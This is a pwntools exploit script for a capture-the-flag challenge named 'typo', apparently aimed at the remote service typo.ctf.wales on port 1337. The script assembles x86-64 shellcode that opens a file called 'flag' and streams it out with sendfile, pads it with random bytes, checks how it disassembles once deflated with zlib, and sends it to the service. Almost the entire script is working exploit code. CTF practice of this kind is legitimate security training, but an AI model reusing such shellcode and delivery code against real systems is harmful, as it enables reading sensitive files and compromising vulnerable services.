from pwn import *

context.binary = './container/typo' #thank you kiddo for teaching me this

import zlib
import random

code = f'''
  .byte {', '.join(hex(b) for b in random.randbytes(3))}
  push 0x67616c66  
  nop
  push SYS_open
  pop rax
  mov rdi, rsp
  xor esi, esi
  syscall
  mov r10d, {random.randrange((1 << 24), (1 << 32) - 1, 1)}
  mov rsi, rax
  push SYS_sendfile
  pop rax
  push 1
  pop rdi
  cdq
  syscall
'''

#print(shellcraft.cat(b'flag'))

code = asm(code)

orig_code_len = len(code)
code += random.randbytes(0x145 - len(code))

deflated = zlib.compress(code, wbits=-15)

print(disasm(deflated[0:orig_code_len + 5]))

#io = process("./a.out")
io = remote("typo.ctf.wales", 1337)
pause()
io.send(code)
io.interactive()

